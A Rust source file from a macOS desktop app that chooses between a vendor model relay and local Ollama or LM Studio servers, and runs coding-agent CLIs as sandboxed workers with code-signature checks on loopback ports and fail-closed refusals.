//! L4 on the desktop (web/docs/plans/teammate-agent.md, WS-F):
//! which model this Mac's local agents use, and running a worker adapter
//! (Claude Code, Codex) instead of eve's launcher when a job asks for one.
//!
//! **What the bundle can do.** Both are off unless the agent bundle says it
//! supports them: `BUNDLE.json`'s `capabilities` lists `"local-model"` (its
//! launcher sends model calls to `LOCAL_AGENT_LOCAL_MODEL_*`) and `"workers"`
//! (its adapters keep a worker inside the folder's fence, without the
//! person's own MCP servers or hooks). A bundle that doesn't list one never
//! gets it: an older launcher would ignore the local model and use the relay.
//!
//! **The model choice** is per Mac: the Native Intelligence model relay (the default, as
//! before L4), or a model on an OpenAI-compatible server the person runs on
//! this Mac, Ollama or LM Studio, each on its fixed loopback port
//! ([`LocalServer::base_url`]). Like the off switch it is native only: it
//! changes in the tray (Local Agents → Model), and no command changes it. The
//! webview runs code our server sends, and a page that could switch it back
//! to the relay would send the folders off the Mac against the person's
//! choice. `local_agent_status` says only whether it is a local model the
//! bundle runs (`localModel`, so the server can narrow its tools), never which.
//! The URL is always Rust's. It is kept in its own `model.json`, which builds
//! before L4 never rewrite.
//!
//! The Model submenu is there only when it offers a choice: the bundle runs
//! local models and a server on this Mac lists a chat model, or the choice
//! already isn't the relay (the way back). Rust looks for the two servers
//! (`GET <base>/models`, the OpenAI list) every [`WATCH_EVERY`] while a folder
//! is shared and local agents are on ([`watch`]), and before every start or
//! resume on a local model. A server counts only when every process of this
//! user's listening on its port is signed by its maker's Developer ID
//! ([`check_listener_on`], security review 2026-10-31): a free loopback port
//! is anyone's to take, and the job's folder would go to whoever did.
//!
//! **Workers** run the person's own coding agent CLI on their own account,
//! with network access. Which agents there are is data, not code: the
//! entries of the bundle's `workers/registry.json` ([`Registry`]: an id, a
//! label, the CLI's name), read only from the bundle on disk, never from the
//! page or the network. Each needs the person's yes, per Mac, in the tray
//! (Local Agents → Coding Agents; off by default), and a bundle that lists
//! `"workers"` and carries the adapter, the registry and the agents' protocol
//! adapters ([`WorkerFiles`]); and then a yes in a native confirm for each
//! launch ([`super::starts`]). `local_agent_start { worker }` names a
//! registry id; Rust then runs the one adapter for every worker,
//! `<node> <bundle>/workers/acp.mjs` (in a dev checkout, the build of it:
//! `<agentDir>/.output/workers/acp.mjs`), with `LOCAL_AGENT_WORKER` (the id),
//! `LOCAL_AGENT_WORKER_BIN` (the CLI as found on the login shell's PATH,
//! named as the entry's `cli`; Native Intelligence never installs it),
//! `LOCAL_AGENT_ACP_DIR` (the bundle's `acp/`, where the agents' protocol
//! adapters are installed) and `LOCAL_AGENT_FENCE_DIR` (the folder of the
//! job's fence markers, made just before: [`super::fence`]). The job's folder (the adapter's cwd) is
//! `<root>/jobs/<id>`; the adapter makes the agent's private home inside it,
//! `<root>/jobs/<id>/home`, with links to the person's keychain folder and
//! login, so the only removal of a job's folder here
//! (a new job whose first launch failed) is `remove_dir_all`, which removes a
//! link and never follows it. The job keeps its worker, so a resume
//! relaunches the same one.
//! Everything else is eve's: the supervisor, stop and exit handling, the cap
//! and parking.
//!
//! A worker's session id is whatever the agent answered, and it travels in
//! JSON only, never on a command line. Still, it is only ever one this Mac
//! recorded from the adapter's own `session` line, 1 to 256 of
//! `[A-Za-z0-9._:-]` starting with a letter or digit ([`is_worker_session`],
//! the adapter's own rule; [`check_worker_resume`]): Rust records no other,
//! and a server-supplied id (`local_agent_start`'s `resume`) is refused unless
//! it is that one.
//!
//! A worker's edit job works in a worktree like eve's, and Rust commits when
//! it finishes, after checking again what the fence keeps out: a commit that
//! would add or change an auto-run config, anything in a `.git` or an `.app`
//! is refused whole ([`super::git::worker_commit_refuses`]).
//!
//! **A pull request** from a worker goes the way our own agent's does: its
//! `finish { pull_request }` makes the adapter send the same `push` prompt
//! line, Rust commits at once (after the sweep of its fence outside the
//! adapter's tree, and the commit-time refusal above), asks the person
//! natively, and on a yes pushes exactly that commit as the person and opens
//! the pull request, through their `gh` or the server's route
//! (`POST /api/local-agent/sessions/<jobId>/pull-request`) with the session
//! token Rust holds for the job. The worker itself never gets that token, nor
//! any Native Intelligence credential. Fence-widening prompts stay refused
//! for workers ([`NO_WIDER_FENCE`]).
//!
//! **Fail closed.** A job never reaches the relay against the choice:
//! - local model: the launcher gets the local server and no relay URL (its
//!   session token still comes, for the Native Intelligence tools: teammate-agent C1);
//! - worker: neither relay variable nor the dev key; it uses its vendor;
//! - while the model is local, worker jobs are refused (a worker sends the
//!   folder to its vendor);
//! - switching to a local model stops or parks the jobs still on the relay or
//!   a worker, and taking back a worker's yes stops its jobs.
//!
//! Every refusal happens in the command handler ([`LocalAgentService::check_start`]),
//! before a slot is taken, an idle job parked or a worktree made, and none
//! names the model or its server (the page runs server code). The actor
//! re-checks the result against the choice of the moment when it launches
//! ([`Actor::run_spec`]).

use crate::sidecar::NoConsole;
use std::collections::HashMap;
use std::future::Future;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::pin::Pin;
use std::sync::{Arc, OnceLock};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use serde_json::Value;
use tokio::sync::{mpsc, oneshot};

use super::config::{is_executable, LaunchConfig, Resolver, MODEL_RELAY_PATH};
use super::state::{create_private_dir, Job};
use super::{Actor, Checked, LocalAgentService, Reply};

/// How often Rust looks for the servers while a folder is shared.
pub const WATCH_EVERY: Duration = Duration::from_secs(30);
/// How long one server gets to list its models.
const DETECT_TIMEOUT: Duration = Duration::from_millis(1_500);
/// Largest model list read.
const MAX_LIST_BYTES: usize = 1 << 20;
/// Models kept per server.
const MAX_MODELS: usize = 100;
/// Ollama's tags for models it runs on ollama.com, not this Mac ([`drop_remote`]).
const OLLAMA_CLOUD_SUFFIX: &str = "-cloud";
/// Models the tray lists per server (the chosen one always, besides).
const MENU_MODELS: usize = 15;
/// Longest model id.
const MAX_MODEL_ID: usize = 256;
/// The longest model id a menu title shows, in characters.
const TITLE_MODEL_MAX: usize = 40;
/// The bundle capabilities ([`Caps`]).
const CAP_LOCAL_MODEL: &str = "local-model";
const CAP_WORKERS: &str = "workers";
/// The model choice and the workers' yes, in `<app_data>/local-agent/`.
const STORE_FILE: &str = "model.json";
/// Where the person changes them.
const WHERE: &str = "the menu bar's Local Agents → Model";
const WORKERS_WHERE: &str = "the menu bar's Local Agents → Coding Agents";
/// The stored choice doesn't parse (a newer Native Intelligence wrote it, or a hand edit).
const UNREADABLE: &str =
    "this Mac's model choice can't be read by this version of Native Intelligence; pick one again in the menu bar's \
     Local Agents → Model";
/// A local model that isn't served right now; the page is told no more.
const LOCAL_DOWN: &str = "the local model this Mac uses isn't available right now (is its app running?); open \
                          it, or pick another model in the menu bar's Local Agents → Model";
const NO_LOCAL_SUPPORT: &str =
    "this build of Native Intelligence can't run a local model; pick Native Intelligence in the menu bar's Local Agents → Model";
/// A worker's `fence` prompt (teammate C3) is refused with this: nothing on
/// the Mac could hold the person's own CLI to a wider fence.
pub const NO_WIDER_FENCE: &str = "a coding agent's access can't be widened";
/// A job keeps the model mode its session was claimed with ([`check_mode`]).
const MODE_NOW_LOCAL: &str =
    "this job ran on Native Intelligence's model, and this Mac has since switched to a local model; start a new job to use it";
const MODE_NOW_RELAY: &str =
    "this job ran on this Mac's local model, and this Mac has since switched to Native Intelligence's model; start a new job to use it";
/// A worker's session id is only ever one this Mac recorded ([`check_worker_resume`]).
const FOREIGN_SESSION: &str =
    "a coding agent's job resumes only on a session this Mac recorded for it; start a new job";
const BAD_SESSION: &str = "this job's session isn't one a coding agent can resume; start a new job";
/// Something changed between the handler's checks and the launch.
pub(super) const CHANGED: &str = "this Mac's model or coding agents changed while the job was starting; start it again";
/// The bundle has no usable registry, adapter or agents' adapters
/// ([`WorkerFiles::present`]), or doesn't list `"workers"`.
const NO_WORKERS: &str = "this build of Native Intelligence can't run coding agents yet";

/// The one adapter every worker runs, in the bundle's `workers/`.
const ADAPTER: &str = "acp";
/// The agents, as data, beside it.
const REGISTRY_FILE: &str = "registry.json";
/// Where the bundle has the agents' protocol adapters installed
/// (`workers/install-agents.sh`; `LOCAL_AGENT_ACP_DIR`).
const ACP_DIR: &str = "acp";
/// Largest registry read, entries kept, and an entry's longest label and
/// CLI name.
const MAX_REGISTRY_BYTES: u64 = 64 * 1024;
const MAX_WORKERS: usize = 32;
const MAX_LABEL: usize = 40;
const MAX_CLI: usize = 64;
/// A worker session id's longest (the adapter's `SESSION_ID`).
const MAX_WORKER_SESSION: usize = 256;

/// A coding agent a job can run on instead of eve: one entry of the
/// bundle's registry ([`Registry`]).
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct Worker {
    /// The registry key: what the page sends, `model.json` stores and the
    /// adapter gets as `LOCAL_AGENT_WORKER` (`claude-code`).
    pub id: String,
    /// Its name in sentences, menus and confirms (`Claude Code`).
    pub label: String,
    /// The executable looked up on the login shell's PATH (`claude`).
    pub cli: String,
}

/// The folder a remembered yes names for a grant at `grant_path`: its
/// realpath now, only while that is the grant's path itself (grants are kept
/// as realpaths, and compared as such: [`super::folder::canonical_dir`]).
fn yes_folder(grant_path: &str) -> Option<String> {
    let real = super::folder::canonical_dir(Path::new(grant_path)).ok()?;
    (real.to_str() == Some(grant_path)).then(|| grant_path.to_string())
}

/// A worker's tray item: what a yes means, plainly.
fn allow_label(label: &str) -> String {
    format!("Allow {label} (your own {label} account, with network access)")
}

/// A registry key, as the adapter's registry has it: a lowercase letter,
/// then up to 31 lowercase letters, digits or `-`.
pub fn is_worker_id(id: &str) -> bool {
    let b = id.as_bytes();
    !b.is_empty()
        && b.len() <= 32
        && b[0].is_ascii_lowercase()
        && b.iter().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || *c == b'-')
}

/// `local_agent_start`'s `worker`, before the registry is read: its shape only.
pub fn check_worker_id(id: &str) -> Result<(), String> {
    if is_worker_id(id) {
        Ok(())
    } else {
        Err("worker is not a coding agent's id".into())
    }
}

/// A label shown in the tray and in a native confirm: plain ASCII words.
fn is_label(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= MAX_LABEL
        && s.trim() == s
        && !s.contains("  ")
        && s.bytes().all(|b| b.is_ascii_alphanumeric() || b" .+_-".contains(&b))
}

/// An executable's name, never a path or a flag.
fn is_cli_name(s: &str) -> bool {
    let b = s.as_bytes();
    !b.is_empty()
        && b.len() <= MAX_CLI
        && b[0].is_ascii_alphanumeric()
        && b.iter().all(|c| c.is_ascii_alphanumeric() || b"._-".contains(c))
}

/// The bundle's `workers/registry.json`: the coding agents it can run, by
/// id. Only `label` and `cli` are Rust's; the rest of each entry (the
/// adapter's command, its environment, its login) is the adapter's, which
/// checks it again. Read from the signed bundle on disk only.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Registry {
    /// By id.
    workers: Vec<Worker>,
}

impl Registry {
    /// A malformed registry is a broken bundle: all of it is refused, and
    /// with it every worker.
    pub fn parse(bytes: &[u8]) -> Result<Registry, String> {
        // A key twice (an agent, or a field of one) is a broken file, never
        // "the last one wins".
        serde_json::from_slice::<NoDuplicateKeys>(bytes)
            .map_err(|e| format!("the coding agents' registry doesn't parse: {e}"))?;
        let v: Value = serde_json::from_slice(bytes).map_err(|e| format!("the coding agents' registry doesn't parse: {e}"))?;
        let entries = v.as_object().ok_or("the coding agents' registry isn't an object")?;
        if entries.is_empty() || entries.len() > MAX_WORKERS {
            return Err(format!("the coding agents' registry lists {} agents (1 to {MAX_WORKERS})", entries.len()));
        }
        let mut workers = Vec::with_capacity(entries.len());
        for (id, entry) in entries {
            let bad = |what: &str| format!("the coding agents' registry: {id:?} {what}");
            if !is_worker_id(id) {
                return Err(bad("isn't a worker id"));
            }
            let entry = entry.as_object().ok_or_else(|| bad("isn't an object"))?;
            let field = |name: &str| entry.get(name).and_then(Value::as_str);
            let label = field("label").filter(|l| is_label(l)).ok_or_else(|| bad("has no usable label"))?;
            let cli = field("cli").filter(|c| is_cli_name(c)).ok_or_else(|| bad("has no usable cli"))?;
            workers.push(Worker {
                id: id.clone(),
                label: label.to_string(),
                cli: cli.to_string(),
            });
        }
        workers.sort_by(|a, b| a.id.cmp(&b.id));
        Ok(Registry { workers })
    }

    /// The registry at `path` (at most [`MAX_REGISTRY_BYTES`]).
    pub fn load(path: &Path) -> Result<Registry, String> {
        let meta = std::fs::metadata(path).map_err(|e| format!("{} can't be read: {e}", path.display()))?;
        if !meta.is_file() || meta.len() > MAX_REGISTRY_BYTES {
            return Err(format!("{} isn't a registry file", path.display()));
        }
        let bytes = std::fs::read(path).map_err(|e| format!("{} can't be read: {e}", path.display()))?;
        Registry::parse(&bytes)
    }

    pub fn workers(&self) -> &[Worker] {
        &self.workers
    }

    pub fn get(&self, id: &str) -> Option<&Worker> {
        self.workers.iter().find(|w| w.id == id)
    }

    /// `id`, or the refusal of a worker this bundle doesn't know.
    pub fn resolve(&self, id: &str) -> Result<&Worker, String> {
        self.get(id).ok_or_else(|| {
            let ids: Vec<String> = self.workers.iter().map(|w| format!("\"{}\"", w.id)).collect();
            format!("worker must be one of {}", ids.join(", "))
        })
    }
}

/// Any JSON, refused if an object anywhere in it has a key twice.
struct NoDuplicateKeys;

impl<'de> Deserialize<'de> for NoDuplicateKeys {
    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        struct Visit;
        impl<'de> serde::de::Visitor<'de> for Visit {
            type Value = NoDuplicateKeys;
            fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
                f.write_str("JSON")
            }
            fn visit_map<A: serde::de::MapAccess<'de>>(self, mut map: A) -> Result<NoDuplicateKeys, A::Error> {
                let mut seen = std::collections::HashSet::new();
                while let Some(key) = map.next_key::<String>()? {
                    if !seen.insert(key.clone()) {
                        return Err(serde::de::Error::custom(format!("{key:?} appears twice")));
                    }
                    map.next_value::<NoDuplicateKeys>()?;
                }
                Ok(NoDuplicateKeys)
            }
            fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<NoDuplicateKeys, A::Error> {
                while seq.next_element::<NoDuplicateKeys>()?.is_some() {}
                Ok(NoDuplicateKeys)
            }
            fn visit_bool<E>(self, _: bool) -> Result<NoDuplicateKeys, E> {
                Ok(NoDuplicateKeys)
            }
            fn visit_i64<E>(self, _: i64) -> Result<NoDuplicateKeys, E> {
                Ok(NoDuplicateKeys)
            }
            fn visit_u64<E>(self, _: u64) -> Result<NoDuplicateKeys, E> {
                Ok(NoDuplicateKeys)
            }
            fn visit_f64<E>(self, _: f64) -> Result<NoDuplicateKeys, E> {
                Ok(NoDuplicateKeys)
            }
            fn visit_str<E>(self, _: &str) -> Result<NoDuplicateKeys, E> {
                Ok(NoDuplicateKeys)
            }
            fn visit_unit<E>(self) -> Result<NoDuplicateKeys, E> {
                Ok(NoDuplicateKeys)
            }
        }
        d.deserialize_any(Visit)
    }
}

/// Where a bundle keeps what its workers need: the app's bundle itself, or
/// in a dev checkout its build, `<agentDir>/.output`
/// (`scripts/local-agent/build.sh`), since the adapter can't run from source.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorkerFiles {
    /// `workers/acp.mjs`: what `<node>` runs for every worker.
    pub adapter: PathBuf,
    /// `workers/registry.json`.
    pub registry: PathBuf,
    /// `acp/`: `LOCAL_AGENT_ACP_DIR`.
    pub acp_dir: PathBuf,
}

impl WorkerFiles {
    /// A launch's: a launcher run from TypeScript is a dev checkout's. Any
    /// other launcher (the tests' stand-ins) names the adapter by its own
    /// extension, beside it in the bundle's layout.
    pub fn for_launch(launch: &LaunchConfig) -> WorkerFiles {
        let agent = Path::new(&launch.agent_dir);
        match launch.launcher.extension().and_then(|e| e.to_str()).unwrap_or("mjs") {
            "ts" => WorkerFiles::under(&agent.join(".output"), "mjs"),
            ext => WorkerFiles::under(agent, ext),
        }
    }

    /// The watcher's, which has no launch: `from_source`, a dev checkout.
    pub fn for_agent(agent_dir: &Path, from_source: bool) -> WorkerFiles {
        if from_source {
            WorkerFiles::under(&agent_dir.join(".output"), "mjs")
        } else {
            WorkerFiles::under(agent_dir, "mjs")
        }
    }

    fn under(root: &Path, ext: &str) -> WorkerFiles {
        WorkerFiles {
            adapter: root.join("workers").join(format!("{ADAPTER}.{ext}")),
            registry: root.join("workers").join(REGISTRY_FILE),
            acp_dir: root.join(ACP_DIR),
        }
    }

    /// All of it is there: without any one, workers are off.
    pub fn present(&self) -> bool {
        self.adapter.is_file() && self.registry.is_file() && self.acp_dir.is_dir()
    }

    /// The registry, when everything a worker needs is there and it parses.
    /// A broken one is logged once per reason and counts as none.
    pub fn registry_if_complete(&self) -> Option<Registry> {
        // Off on every other system: nothing there yet holds a worker's whole
        // process tree to its job (see `fence`'s notes on Windows).
        if !cfg!(target_os = "macos") || !self.present() {
            return None;
        }
        match Registry::load(&self.registry) {
            Ok(r) => Some(r),
            Err(e) => {
                note_registry(&e);
                None
            }
        }
    }
}

/// The app log says when the registry can't be used, once per reason.
fn note_registry(why: &str) {
    static LAST: std::sync::Mutex<String> = std::sync::Mutex::new(String::new());
    let Ok(mut last) = LAST.lock() else { return };
    if *last != why {
        crate::log_to_file(&format!("[local-agent] coding agents are off: {why}"));
        *last = why.to_string();
    }
}

/// An OpenAI-compatible model server on this Mac, on its default port.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum LocalServer {
    Ollama,
    LmStudio,
}

impl LocalServer {
    pub const ALL: [LocalServer; 2] = [LocalServer::Ollama, LocalServer::LmStudio];

    pub fn as_str(self) -> &'static str {
        match self {
            LocalServer::Ollama => "ollama",
            LocalServer::LmStudio => "lmstudio",
        }
    }

    fn parse(s: &str) -> Option<LocalServer> {
        LocalServer::ALL.into_iter().find(|v| v.as_str() == s)
    }

    pub fn name(self) -> &'static str {
        match self {
            LocalServer::Ollama => "Ollama",
            LocalServer::LmStudio => "LM Studio",
        }
    }

    /// Its OpenAI-compatible API: loopback only, and Rust's alone.
    pub fn base_url(self) -> &'static str {
        match self {
            LocalServer::Ollama => "http://127.0.0.1:11434/v1",
            LocalServer::LmStudio => "http://127.0.0.1:1234/v1",
        }
    }

    /// [`LocalServer::base_url`]'s port.
    pub fn port(self) -> u16 {
        match self {
            LocalServer::Ollama => 11434,
            LocalServer::LmStudio => 1234,
        }
    }

    /// What the process listening on its port must be signed as
    /// ([`check_listener_on`]): its maker's Developer ID team, Infra
    /// Technologies for Ollama (the app and the `ollama` server inside it),
    /// Element Labs for LM Studio (the app, its helpers and `lms`).
    pub fn requirement(self) -> &'static str {
        match self {
            LocalServer::Ollama => "anchor apple generic and certificate leaf[subject.OU] = \"3MU9H2V9Y9\"",
            LocalServer::LmStudio => "anchor apple generic and certificate leaf[subject.OU] = \"D65G88RHWN\"",
        }
    }
}

/// The model this Mac's local agents use.
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "lowercase", deny_unknown_fields)]
pub enum ModelChoice {
    /// The Native Intelligence model relay (`<origin>/api/local-agent/model`).
    #[default]
    Relay,
    /// A model on a server on this Mac, by its id in the server's list.
    Local { server: LocalServer, model: String },
}

impl ModelChoice {
    pub fn is_relay(&self) -> bool {
        *self == ModelChoice::Relay
    }

    /// model.json's `model`: absent for the relay. Kept as raw JSON, so a
    /// value this build can't read (a newer Native Intelligence's) survives a save
    /// untouched; until the person picks again, launches are refused.
    pub fn from_stored(stored: Option<&Value>) -> Result<ModelChoice, String> {
        let Some(v) = stored else { return Ok(ModelChoice::Relay) };
        let choice: ModelChoice = serde_json::from_value(v.clone()).map_err(|_| UNREADABLE.to_string())?;
        if let ModelChoice::Local { model, .. } = &choice {
            check_model_id(model).map_err(|_| UNREADABLE.to_string())?;
        }
        Ok(choice)
    }

    pub fn to_stored(&self) -> Option<Value> {
        match self {
            ModelChoice::Relay => None,
            local => serde_json::to_value(local).ok(),
        }
    }

    /// How menus and the app log name it (never the page: it runs server code).
    pub fn label(&self) -> String {
        match self {
            ModelChoice::Relay => "Native Intelligence".into(),
            ModelChoice::Local { server, model } => format!("{model} ({})", server.name()),
        }
    }

    /// Its tray item's id (after the tray's prefix): `relay`, or
    /// `<server>:<model>`. Model ids may hold `:` and `/`; only the first
    /// `:` splits.
    pub fn menu_id(&self) -> String {
        match self {
            ModelChoice::Relay => "relay".into(),
            ModelChoice::Local { server, model } => format!("{}:{model}", server.as_str()),
        }
    }

    pub fn from_menu_id(id: &str) -> Option<ModelChoice> {
        if id == "relay" {
            return Some(ModelChoice::Relay);
        }
        let (server, model) = id.split_once(':')?;
        check_model_id(model).ok()?;
        Some(ModelChoice::Local {
            server: LocalServer::parse(server)?,
            model: model.to_string(),
        })
    }
}

/// A model id as a server lists it, fit for one env value: 1 to
/// [`MAX_MODEL_ID`] printable ASCII characters, no spaces.
pub fn check_model_id(id: &str) -> Result<(), String> {
    if id.is_empty() || id.len() > MAX_MODEL_ID || !id.bytes().all(|b| b.is_ascii_graphic()) {
        return Err(format!("a model id is 1 to {MAX_MODEL_ID} printable ASCII characters"));
    }
    Ok(())
}

/// What the agent bundle says it can do (`BUNDLE.json` `capabilities`).
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Caps {
    pub local_model: bool,
    pub workers: bool,
}

/// `<agent>/BUNDLE.json`'s capabilities. A missing or unreadable file, or
/// no `capabilities`, is nothing.
pub fn bundle_caps(agent_dir: &Path) -> Caps {
    let Ok(bytes) = std::fs::read(agent_dir.join("BUNDLE.json")) else {
        return Caps::default();
    };
    let Ok(v) = serde_json::from_slice::<Value>(&bytes) else {
        return Caps::default();
    };
    let has = |cap: &str| {
        v.get("capabilities")
            .and_then(Value::as_array)
            .is_some_and(|a| a.iter().any(|c| c.as_str() == Some(cap)))
    };
    Caps {
        local_model: has(CAP_LOCAL_MODEL),
        workers: has(CAP_WORKERS),
    }
}

/// What Rust found on one server.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Detected {
    pub server: LocalServer,
    /// It answered `GET <base>/models` with an OpenAI model list.
    pub running: bool,
    /// Its chat models in its order (embedding models left out).
    pub models: Vec<String>,
    /// Something answered on its port but isn't used ([`check_listener_on`]):
    /// the tray's Model menu says why ([`Refused::note`]).
    pub refused: Option<&'static str>,
}

impl Detected {
    fn serves(&self, model: &str) -> bool {
        self.running && self.models.iter().any(|m| m == model)
    }

    /// It offers something to pick.
    fn offers(&self) -> bool {
        self.running && !self.models.is_empty()
    }

    fn down(server: LocalServer) -> Detected {
        Detected {
            server,
            running: false,
            models: Vec::new(),
            refused: None,
        }
    }
}

/// The ids in an OpenAI `GET /models` answer: `None` unless it is one. Ids
/// that are no use as an env value are skipped, as are embedding models.
pub fn parse_models(body: &[u8]) -> Option<Vec<String>> {
    let list: Value = serde_json::from_slice(body).ok()?;
    let mut out: Vec<String> = Vec::new();
    for entry in list.get("data")?.as_array()? {
        let Some(id) = entry.get("id").and_then(Value::as_str) else { continue };
        if check_model_id(id).is_err() || id.to_ascii_lowercase().contains("embed") || out.iter().any(|m| m == id) {
            continue;
        }
        out.push(id.to_string());
        if out.len() == MAX_MODELS {
            break;
        }
    }
    Some(out)
}

/// Loopback only: no proxy, no redirects, short timeouts. Built once; if it
/// can't be, every server counts as not running.
fn detect_client() -> Option<&'static reqwest::Client> {
    static CLIENT: OnceLock<Option<reqwest::Client>> = OnceLock::new();
    CLIENT
        .get_or_init(|| {
            reqwest::Client::builder()
                .no_proxy()
                .redirect(reqwest::redirect::Policy::none())
                .connect_timeout(Duration::from_millis(500))
                .timeout(DETECT_TIMEOUT)
                .build()
                .ok()
        })
        .as_ref()
}

/// Ask the server at `base` for its models.
async fn detect_at(client: &reqwest::Client, server: LocalServer, base: &str) -> Detected {
    let Ok(mut resp) = client.get(format!("{base}/models")).send().await else {
        return Detected::down(server);
    };
    if !resp.status().is_success() {
        return Detected::down(server);
    }
    let mut body = Vec::new();
    loop {
        match resp.chunk().await {
            Ok(Some(chunk)) if body.len() + chunk.len() <= MAX_LIST_BYTES => body.extend_from_slice(&chunk),
            Ok(None) => break,
            Ok(Some(_)) | Err(_) => return Detected::down(server),
        }
    }
    let Some(models) = parse_models(&body) else {
        return Detected::down(server);
    };
    let models = match server {
        LocalServer::Ollama => drop_remote(client, base, models).await,
        LocalServer::LmStudio => models,
    };
    Detected {
        server,
        running: true,
        models,
        refused: None,
    }
}

/// A response body, at most [`MAX_LIST_BYTES`]; `None` past that or on error.
async fn read_capped(mut resp: reqwest::Response) -> Option<Vec<u8>> {
    let mut body = Vec::new();
    loop {
        match resp.chunk().await {
            Ok(Some(chunk)) if body.len() + chunk.len() <= MAX_LIST_BYTES => body.extend_from_slice(&chunk),
            Ok(None) => return Some(body),
            Ok(Some(_)) | Err(_) => return None,
        }
    }
}

/// Ollama lists its cloud models beside the local ones but runs them on
/// ollama.com, so a job's folder would leave the Mac. Drop them: by their
/// `-cloud` tag, and by what `POST /api/show` says (`remote_host` or
/// `remote_model`). A model whose `/api/show` can't be read is dropped too.
/// Answers are remembered for the app run (a tag's home doesn't move).
async fn drop_remote(client: &reqwest::Client, base: &str, models: Vec<String>) -> Vec<String> {
    static REMOTE: OnceLock<std::sync::Mutex<HashMap<String, bool>>> = OnceLock::new();
    let known = REMOTE.get_or_init(Default::default);
    let root = base.strip_suffix("/v1").unwrap_or(base).to_string();
    let mut asks = tokio::task::JoinSet::new();
    for (i, id) in models.iter().enumerate() {
        if id.ends_with(OLLAMA_CLOUD_SUFFIX) {
            continue;
        }
        let key = format!("{root} {id}");
        if let Some(remote) = known.lock().unwrap().get(&key).copied() {
            asks.spawn(async move { (i, Some(remote)) });
            continue;
        }
        let (client, url, id) = (client.clone(), format!("{root}/api/show"), id.clone());
        asks.spawn(async move {
            let remote = async {
                let resp = client.post(url).json(&serde_json::json!({ "model": id })).send().await.ok()?;
                if !resp.status().is_success() {
                    return None;
                }
                let v: Value = serde_json::from_slice(&read_capped(resp).await?).ok()?;
                Some(v.get("remote_host").is_some() || v.get("remote_model").is_some())
            }
            .await;
            (i, remote)
        });
    }
    let mut local = vec![false; models.len()];
    while let Some(Ok((i, remote))) = asks.join_next().await {
        if let Some(remote) = remote {
            known.lock().unwrap().insert(format!("{root} {}", models[i]), remote);
            local[i] = !remote;
        }
    }
    models.into_iter().zip(local).filter(|(_, l)| *l).map(|(m, _)| m).collect()
}

/// Both servers, at once.
pub async fn detect_all() -> Vec<Detected> {
    let Some(client) = detect_client() else {
        return LocalServer::ALL.into_iter().map(Detected::down).collect();
    };
    let (ollama, lmstudio) = tokio::join!(
        detect_checked(client, LocalServer::Ollama),
        detect_checked(client, LocalServer::LmStudio),
    );
    vec![ollama, lmstudio]
}

/// [`detect_at`] on the server's own port, counted as running only when the
/// process listening there is its maker's ([`check_listener_on`]): anything
/// on this Mac (another user's process, a sandboxed app) could take a free
/// loopback port first, and a job's folder would go to it.
async fn detect_checked(client: &reqwest::Client, server: LocalServer) -> Detected {
    let found = detect_at(client, server, server.base_url()).await;
    if !found.running {
        return found;
    }
    match check_listener_on(server.port(), server.requirement()).await {
        Ok(()) => {
            note_listener(server, None);
            found
        }
        Err(refused) => {
            note_listener(server, Some(&refused.why));
            Detected {
                refused: Some(refused.note),
                ..Detected::down(server)
            }
        }
    }
}

/// Why what answers on a server's port isn't used: a few words for the
/// tray's Model menu, and all of it for the app log. A Homebrew or Docker
/// build of Ollama is the usual one: it isn't signed by its maker.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Refused {
    pub note: &'static str,
    pub why: String,
}

/// [`Refused::note`]s.
pub const NOT_SIGNED: &str = "Not Its Signed App";
pub const NOT_YOURS: &str = "Another User Holds Its Port";
pub const UNCHECKED: &str = "Couldn't Be Checked";

/// The app log says when a server's port is refused, once per reason.
fn note_listener(server: LocalServer, refused: Option<&str>) {
    static LAST: std::sync::Mutex<Vec<(LocalServer, String)>> = std::sync::Mutex::new(Vec::new());
    let Ok(mut last) = LAST.lock() else { return };
    let said = last.iter().find(|(s, _)| *s == server).map(|(_, why)| why.clone());
    if said.as_deref() == refused {
        return;
    }
    last.retain(|(s, _)| *s != server);
    if let Some(why) = refused {
        crate::log_to_file(&format!(
            "[local-agent] not using what answers on {}'s port: {why}",
            server.name()
        ));
        last.push((server, why.to_string()));
    }
}

/// `lsof` or `codesign`, at most this long.
const LISTENER_CHECK_TIMEOUT: Duration = Duration::from_secs(3);

/// The pids in `lsof -F p` output (its `p<pid>` lines).
pub fn lsof_pids(out: &str) -> Vec<i32> {
    let mut pids: Vec<i32> = out
        .lines()
        .filter_map(|l| l.strip_prefix('p'))
        .filter_map(|p| p.parse().ok())
        .filter(|p| *p > 0)
        .collect();
    pids.sort_unstable();
    pids.dedup();
    pids
}

/// A system tool, with a clean environment: whether it exited 0, and its
/// stdout.
async fn run_tool(program: &str, args: &[&str]) -> Result<(bool, String), String> {
    let mut cmd = tokio::process::Command::new(program);
    cmd.no_console();
    cmd.args(args)
        .env_clear()
        .env("PATH", "/usr/bin:/bin:/usr/sbin:/sbin")
        .env("LANG", "en_US.UTF-8")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true);
    match tokio::time::timeout(LISTENER_CHECK_TIMEOUT, cmd.output()).await {
        Err(_) => Err(format!("{program} took over {LISTENER_CHECK_TIMEOUT:?}")),
        Ok(Err(e)) => Err(format!("{program} couldn't run: {e}")),
        Ok(Ok(out)) => Ok((out.status.success(), String::from_utf8_lossy(&out.stdout).into_owned())),
    }
}

/// Whatever listens on TCP `port` (on any address) runs code that meets
/// `requirement`: `lsof` lists this user's listening processes (it sees no
/// other user's), and `codesign` checks each one's running code. Something
/// answered there, so none listed means another user's or the system's
/// process holds the port: refused, as is any listener that doesn't meet it.
